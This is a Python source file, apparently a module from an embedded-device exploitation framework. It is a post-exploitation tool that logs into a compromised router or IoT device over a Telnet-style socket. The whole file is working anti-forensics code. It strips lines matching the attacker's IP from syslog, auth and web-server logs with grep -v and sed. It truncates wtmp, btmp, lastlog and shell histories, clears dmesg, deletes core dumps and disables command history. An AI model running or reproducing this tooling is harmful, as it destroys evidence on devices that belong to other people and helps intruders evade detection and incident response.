# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""Post-exploitation log cleanup on embedded devices.

Removes or sanitizes log entries from compromised embedded/IoT devices to
reduce forensic artifacts. Targets standard log locations: /var/log/*,
/tmp/log*, syslog, wtmp/utmp, lastlog, auth.log, and device-specific logs.

Operates via SSH or Telnet session on the compromised device. Supports
selective cleanup using regex patterns to remove only entries matching
the attacker's activity.

MITRE ATT&CK: T1070 (Indicator Removal), T1070.002 (Clear Linux or Mac System Logs)
References:
  - https://attack.mitre.org/techniques/T1070/
  - https://attack.mitre.org/techniques/T1070/002/

Version: 1.0.0
"""
from __future__ import annotations

import re
import socket
import time
from typing import Dict, List, Optional, Tuple

from embedxpl.core.exploit import (
    Exploit as BaseExploit,
    OptIP,
    OptPort,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_table,
    print_warning,
)


# Log file locations common on embedded Linux systems
_LOG_TARGETS: List[Tuple[str, str, str]] = [
    # (path, description, cleanup_method)
    # Text-based logs (can be grep-filtered)
    ("/var/log/messages", "System messages", "filter"),
    ("/var/log/syslog", "Syslog", "filter"),
    ("/var/log/auth.log", "Authentication log", "filter"),
    ("/var/log/secure", "Secure log (auth)", "filter"),
    ("/var/log/daemon.log", "Daemon log", "filter"),
    ("/var/log/kern.log", "Kernel log", "filter"),
    ("/var/log/dmesg", "Kernel ring buffer", "filter"),
    ("/tmp/log/messages", "Temp syslog (tmpfs)", "filter"),
    ("/tmp/log/syslog", "Temp syslog", "filter"),
    ("/tmp/syslog.log", "Temp syslog file", "filter"),
    ("/var/log/dropbear", "Dropbear SSH log", "filter"),
    ("/var/log/lighttpd/error.log", "Lighttpd error log", "filter"),
    ("/var/log/lighttpd/access.log", "Lighttpd access log", "filter"),
    ("/var/log/uhttpd.log", "OpenWrt uhttpd log", "filter"),
    ("/var/log/nginx/access.log", "Nginx access log", "filter"),
    ("/var/log/nginx/error.log", "Nginx error log", "filter"),
    # Binary logs (must be zeroed or truncated)
    ("/var/log/wtmp", "Login records (binary)", "truncate"),
    ("/var/log/btmp", "Failed login records (binary)", "truncate"),
    ("/var/log/utmp", "Current login records (binary)", "truncate"),
    ("/var/log/lastlog", "Last login records (binary)", "truncate"),
    ("/var/run/utmp", "Runtime utmp", "truncate"),
    # Shell history
    ("/root/.ash_history", "Ash shell history", "truncate"),
    ("/root/.bash_history", "Bash shell history", "truncate"),
    ("/root/.sh_history", "Shell history", "truncate"),
    ("/tmp/.ash_history", "Temp ash history", "truncate"),
]


class Exploit(BaseExploit):
    """Embedded Device Log Cleanup.

    Post-exploitation module that removes or sanitizes log entries on
    compromised embedded/IoT devices. Supports selective pattern-based
    filtering of text logs and truncation of binary log files.

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Embedded Device Log Cleanup",
        "description": (
            "Post-exploitation log cleanup on embedded devices. Removes entries from "
            "/var/log/*, syslog, wtmp/utmp, lastlog, shell history. Supports regex-based "
            "selective cleanup. MITRE: T1070, T1070.002."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://attack.mitre.org/techniques/T1070/",
            "https://attack.mitre.org/techniques/T1070/002/",
        ),
        "devices": (
            "OpenWrt routers",
            "BusyBox-based embedded Linux",
            "DD-WRT routers",
            "IoT gateways",
            "Generic embedded Linux devices",
        ),
    }

    target = OptIP("", "Target device IPv4 or IPv6 address")
    port = OptPort(22, "SSH or Telnet port")
    username = OptString("root", "Authentication username")
    password = OptString("", "Authentication password")
    pattern = OptString("", "Regex pattern to remove from text logs (e.g. attacker IP)")

    def run(self) -> None:
        """Execute log cleanup on the target device."""
        cleanup_pattern = str(self.pattern).strip()
        if not cleanup_pattern:
            print_warning(
                "No pattern specified. Will truncate/clear all logs entirely. "
                "Set 'pattern' to selectively remove only matching entries."
            )

        print_status("Log cleanup starting on {}:{}".format(self.target, self.port))

        sock = self._connect()
        if sock is None:
            print_error("Failed to connect to {}:{}".format(self.target, self.port))
            return

        try:
            if not self._authenticate(sock):
                print_error("Authentication failed on {}".format(self.target))
                return

            print_success("Authenticated to {} as '{}'".format(self.target, self.username))

            # Phase 1: Enumerate existing logs
            print_status("Phase 1: Enumerating log files...")
            existing_logs = self._enumerate_logs(sock)

            if not existing_logs:
                print_warning("No log files found on target.")
                return

            print_info("Found {} log targets".format(len(existing_logs)))

            # Phase 2: Clean logs
            print_status("Phase 2: Cleaning log entries...")
            results: List[Tuple[str, str, str]] = []

            for log_path, description, method in existing_logs:
                if cleanup_pattern and method == "filter":
                    success = self._filter_log(sock, log_path, cleanup_pattern)
                    action = "filtered"
                elif method == "truncate" or not cleanup_pattern:
                    success = self._truncate_log(sock, log_path)
                    action = "truncated"
                else:
                    success = self._filter_log(sock, log_path, cleanup_pattern)
                    action = "filtered"

                status = "OK" if success else "FAILED"
                results.append((log_path, action, status))

                if success:
                    print_success("  {} : {} ({})".format(log_path, action, description))
                else:
                    print_warning("  {} : failed ({})".format(log_path, description))

            # Phase 3: Additional cleanup
            print_status("Phase 3: Additional trace removal...")
            self._clear_additional_traces(sock)

            # Summary
            successful = sum(1 for _, _, s in results if s == "OK")
            print_success("Log cleanup complete: {}/{} targets cleaned".format(
                successful, len(results),
            ))
            print_table(
                ("Log File", "Action", "Status"),
                *results,
            )

        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _connect(self) -> Optional[socket.socket]:
        """Establish TCP connection to the target."""
        try:
            sock = socket.create_connection(
                (str(self.target), int(self.port)),
                timeout=10,
            )
            sock.settimeout(8)
            return sock
        except (OSError, socket.error) as exc:
            print_error("Connection error: {}".format(exc))
            return None

    def _recv_until(self, sock: socket.socket, markers: List[bytes],
                    timeout: float = 5.0) -> bytes:
        """Receive data until one of the marker sequences appears."""
        data = b""
        end_time = time.monotonic() + timeout
        while time.monotonic() < end_time:
            remaining = end_time - time.monotonic()
            if remaining <= 0:
                break
            sock.settimeout(min(remaining, 2.0))
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                for marker in markers:
                    if marker in data:
                        return data
            except socket.timeout:
                if data:
                    break
            except OSError:
                break
        return data

    def _authenticate(self, sock: socket.socket) -> bool:
        """Authenticate via Telnet-style interactive login."""
        banner = self._recv_until(sock, [b"ogin:", b"sername:", b"#", b"$"], timeout=8)

        if b"#" in banner or b"$" in banner:
            return True

        sock.sendall(str(self.username).encode() + b"\r\n")

        pwd_data = self._recv_until(sock, [b"assword:", b"asscode:", b"#", b"$"], timeout=5)

        if b"#" in pwd_data or b"$" in pwd_data:
            return True

        if b"assword:" in pwd_data or b"asscode:" in pwd_data:
            sock.sendall(str(self.password).encode() + b"\r\n")

        result = self._recv_until(sock, [b"#", b"$", b">"], timeout=5)
        if b"#" in result or b"$" in result or b">" in result:
            return True

        if b"incorrect" in result.lower() or b"denied" in result.lower():
            return False

        sock.sendall(b"id\r\n")
        id_data = self._recv_until(sock, [b"uid="], timeout=3)
        return b"uid=" in id_data

    def _exec_command(self, sock: socket.socket, cmd: str) -> str:
        """Execute a command on the remote device."""
        try:
            sock.settimeout(0.3)
            try:
                sock.recv(4096)
            except socket.timeout:
                pass

            sock.sendall(cmd.encode() + b"\r\n")
            time.sleep(0.3)

            output = self._recv_until(sock, [b"#", b"$", b">"], timeout=5)
            decoded = output.decode("utf-8", errors="replace")

            lines = decoded.splitlines()
            if lines and cmd.split()[0] in lines[0]:
                lines = lines[1:]
            if lines and re.match(r"^[\w\-@.:~#$>]+\s*$", lines[-1]):
                lines = lines[:-1]

            return "\n".join(lines)
        except (OSError, socket.error):
            return ""

    def _enumerate_logs(self, sock: socket.socket) -> List[Tuple[str, str, str]]:
        """Check which log files exist on the target."""
        existing: List[Tuple[str, str, str]] = []

        for log_path, description, method in _LOG_TARGETS:
            # Check existence with test -f
            result = self._exec_command(sock, "test -f {} && echo EXISTS".format(log_path))
            if "EXISTS" in result:
                # Get file size
                size_output = self._exec_command(
                    sock, "wc -c < {} 2>/dev/null".format(log_path),
                )
                size_str = size_output.strip()
                if size_str.isdigit() and int(size_str) > 0:
                    existing.append((log_path, description, method))

        # Also discover log files not in our predefined list
        extra_cmd = (
            "find /var/log /tmp/log -type f -name '*.log' 2>/dev/null | head -20"
        )
        extra_output = self._exec_command(sock, extra_cmd)
        if extra_output:
            known_paths = {t[0] for t in _LOG_TARGETS}
            for line in extra_output.splitlines():
                path = line.strip()
                if path and path.startswith("/") and path not in known_paths:
                    existing.append((path, "discovered log", "filter"))

        return existing

    def _filter_log(self, sock: socket.socket, log_path: str, pattern: str) -> bool:
        """Remove lines matching pattern from a text log file.

        Uses grep -v with the pattern to create a filtered version,
        then replaces the original.
        """
        # Escape single quotes in pattern for shell safety
        safe_pattern = pattern.replace("'", "'\\''")

        # Use grep -v to filter and atomic replacement
        filter_cmd = (
            "grep -v '{pattern}' {path} > {path}.xpl_tmp 2>/dev/null; "
            "mv {path}.xpl_tmp {path} 2>/dev/null && echo FILTERED"
        ).format(pattern=safe_pattern, path=log_path)

        result = self._exec_command(sock, filter_cmd)
        if "FILTERED" in result:
            return True

        # Fallback: use sed to delete matching lines
        sed_cmd = (
            "sed -i '/{pattern}/d' {path} 2>/dev/null && echo SEDOK"
        ).format(pattern=safe_pattern, path=log_path)

        result = self._exec_command(sock, sed_cmd)
        return "SEDOK" in result

    def _truncate_log(self, sock: socket.socket, log_path: str) -> bool:
        """Truncate a log file to zero bytes."""
        truncate_cmd = (
            "> {path} 2>/dev/null && echo TRUNCATED || "
            "cp /dev/null {path} 2>/dev/null && echo TRUNCATED"
        ).format(path=log_path)

        result = self._exec_command(sock, truncate_cmd)
        return "TRUNCATED" in result

    def _clear_additional_traces(self, sock: socket.socket) -> None:
        """Clear additional forensic traces beyond standard log files."""
        commands = [
            # Clear current shell history
            ("unset HISTFILE; history -c 2>/dev/null", "shell history variable"),
            # Clear dmesg ring buffer
            ("dmesg -c > /dev/null 2>&1", "kernel ring buffer"),
            # Remove core dumps
            ("rm -f /tmp/core.* /var/crash/* 2>/dev/null", "core dumps"),
            # Clear DNS cache artifacts
            ("rm -f /tmp/resolv.conf.auto.bak 2>/dev/null", "DNS cache artifacts"),
            # Remove temporary files that might contain artifacts
            ("rm -f /tmp/.xpl* /tmp/.*_history 2>/dev/null", "temp artifacts"),
            # Clear connection tracking state (if available)
            (
                "echo 1 > /proc/sys/net/netfilter/nf_conntrack_count 2>/dev/null || true",
                "conntrack flush attempt",
            ),
            # Sync filesystem to ensure changes are written
            ("sync 2>/dev/null", "filesystem sync"),
        ]

        for cmd, description in commands:
            self._exec_command(sock, cmd)
            print_info("  Cleared: {}".format(description))

        # Clear the current session's command history
        self._exec_command(sock, "HISTSIZE=0; HISTFILESIZE=0; unset HISTFILE")
        print_info("  Disabled command history for current session")

    def check(self) -> bool:
        """Check if target port is reachable."""
        try:
            sock = socket.create_connection(
                (str(self.target), int(self.port)),
                timeout=5,
            )
            sock.close()
            return True
        except (OSError, socket.error):
            return False
